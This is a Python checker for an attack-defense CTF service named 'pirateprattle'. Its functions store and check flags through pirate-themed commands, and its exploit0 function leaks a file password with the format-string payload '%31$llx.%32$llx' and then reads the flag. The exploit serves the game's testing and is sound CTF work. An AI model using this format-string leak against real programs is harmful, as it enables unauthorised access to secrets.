import asyncio
import random
import re
import string
import time
from asyncio import StreamReader, StreamWriter
from logging import LoggerAdapter
from typing import Optional

import faker
from enochecker3 import (AsyncSocket, BaseCheckerTaskMessage, ChainDB,
                         Enochecker, ExploitCheckerTaskMessage, FlagSearcher,
                         GetflagCheckerTaskMessage, GetnoiseCheckerTaskMessage,
                         HavocCheckerTaskMessage, InternalErrorException,
                         MumbleException, OfflineException,
                         PutflagCheckerTaskMessage, PutnoiseCheckerTaskMessage)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 4444
checker = Enochecker("pirateprattle", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

class Connection:
    def __init__(self, socket: AsyncSocket, logger: LoggerAdapter):
        self.reader, self.writer = socket[0], socket[1]
        self.logger = logger
        
    async def create_file(self, directory: str, filename: str, password: str, message: str, flag: str):
        self.logger.debug(
            f"Sending command to create file: {filename} in directory {directory} with message: {message}"
        )
        # Go to the directory
        self.writer.write(f"sail {directory}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b"$ ")
        # Create the file
        self.writer.write(f"bury {filename} {flag}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b": ")
        # Write timestamp
        self.writer.write(f"\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b": ")
        # Write password
        self.writer.write(f"{password}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b": ")
        # Write message
        self.writer.write(f"{message}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b"$ ")

        if not b"Treasure burried at" in data:
            raise MumbleException("Failed to create file")



@checker.register_dependency
def _get_connection(socket: AsyncSocket, logger: LoggerAdapter) -> Connection:
    return Connection(socket, logger)


"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_note(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    conn: Connection,
    logger: LoggerAdapter,    
) -> None:
    # Creating a file in the PirateHideout directory and storing the flag in the db

    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=16)
    )

    # Log a message before any critical action that could raise an error.
    logger.debug(f"Connecting to service")
    logger.debug(f"enoflag is {task.flag}")
    welcome = await conn.reader.readuntil(b"$ ")

    # Get the current time as (YYYY-MM-DD HH:MM AM/PM)
    current_time = time.strftime("%Y-%m-%d %I:%M %p")
    filename = f"flag{current_time.replace(' ', '_').replace(':', '')}"

    # Await create_file
    await conn.create_file("PirateHideout", filename, password, "Hey there, this is the flag", task.flag)

    # Save as an entry in the db for getflag() to use later.
    await db.set("treasurefile", ("PirateHideout", filename, password, task.flag))

    # Exit
    logger.debug(f"Sending exit command")
    conn.writer.write(f"dock".encode())
    await conn.writer.drain()

@checker.getflag(0)
async def getflag_note(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
) -> None:
    try:
        directory, filename, password, flag = await db.get("treasurefile")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    logger.debug(f"Connecting to the service")
    logger.debug(f"File info: {directory}/{filename} with password {password} and flag {flag}")
    await conn.reader.readuntil(b"$ ")

    # Go to the directory
    conn.writer.write(f"sail {directory}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Open the file
    conn.writer.write(f"loot {filename}.treasure\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")

    # Enter the password
    conn.writer.write(f"{password}\n".encode())
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")

    # Check if the flag is in the file
    if not f"{flag}".encode() in data:
            raise MumbleException(f"Couldn't find the flag {flag} in {directory}/{filename}")

    # Exit!
    logger.debug(f"Sending exit command")
    conn.writer.write(f"dock\n".encode())
    await conn.writer.drain()

# Define the flag regex pattern
flag_regex = re.compile(r'ENOFLAG{.*?}')

@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:
    # Ensure flag_regex is set before using it
    if task.flag_regex is None:
        task.flag_regex = flag_regex
        logger.debug(f"Flag regex not set, using default: {task.flag_regex.pattern}")

    
    # Start the telnet session
    await conn.reader.readuntil(b"$ ")

    # Send the command that lists directories
    conn.writer.write(b'scout\n')
    await conn.writer.drain()
    
    # Handle the output and wait for the directories listing
    directories_output = (await conn.reader.readuntil(b"$ ")).decode().replace('\r', '').split('\n')[3:-2]
    # Remove everything that doesn't contain exactly two capital letters
    directories = [directory for directory in directories_output if len(re.findall(r'[A-Z]', directory)) == 2]
    logger.debug(f"Directories output: {directories}")

    treasure_dir = ""
    treasure_file = ""
    
    # Loop through each directory and scout for the .treasure file
    for directory in directories:
        conn.writer.write(f'scout {directory}\n'.encode())
        await conn.writer.drain()
        scout_output = (await conn.reader.readuntil(b"$ ")).decode()

        # Check if the .treasure file is in the directory
        if '.treasure' in scout_output:
            logger.debug(f".treasure file found in {directory}")
            treasure_dir = directory
            # find the full name of the treasure file
            scout_output = scout_output.replace('\r', '').split('\n')
            for idx, line in enumerate(scout_output):
                if '.treasure' in line:
                    treasure_line_idx = idx
                    break
            treasure_file = scout_output[treasure_line_idx]
            break

    # Change to the directory and loot the treasure
    conn.writer.write(f'sail {treasure_dir}\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    conn.writer.write(f'loot {treasure_file}\n'.encode())
    await conn.writer.drain()
    
    # Handle the output and wait for the password prompt
    await conn.reader.readuntil(b": ")

    # Send the format string exploit as the password
    conn.writer.write(b'%31$llx.%32$llx\n')
    await conn.writer.drain()
    
    # Now, wait for the incorrect password message which includes the pattern "is incorrect!"
    incorrect_message_pattern = re.compile(rb'(\w+)\.(\w+).*')

    # Read the buffer to get the incorrect password message
    incorrect_message = await conn.reader.readuntil(incorrect_message_pattern)

    # Extract the two addresses from the captured groups
    address1_hex, address2_hex = incorrect_message_pattern.search(incorrect_message).groups()
    address1_hex, address2_hex = address1_hex.decode(), address2_hex.decode()

    # Convert the addresses to ASCII and reverse them
    address1 = bytes.fromhex(address1_hex).decode()[::-1]
    address2 = bytes.fromhex(address2_hex).decode()[::-1]

    # Print the password
    password = f'{address1}{address2}'
    logger.debug(f'Incorrect message: {incorrect_message}\nAddress 1 Hex: {address1_hex}\nAddress 2 Hex: {address2_hex}\nPassword: {password}')

    # Now try to plunder the file again
    await conn.reader.readuntil(b"$ ")
    conn.writer.write(f'loot {treasure_file}\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")

    conn.writer.write(f'{password}\n'.encode())
    await conn.writer.drain()
    
    # Wait for the output and print it
    result = await conn.reader.readuntil(b"$ ")
    logger.debug(result.decode())

    # Check for the flag in the result
    if flag := searcher.search_flag(result):
        return flag

    raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()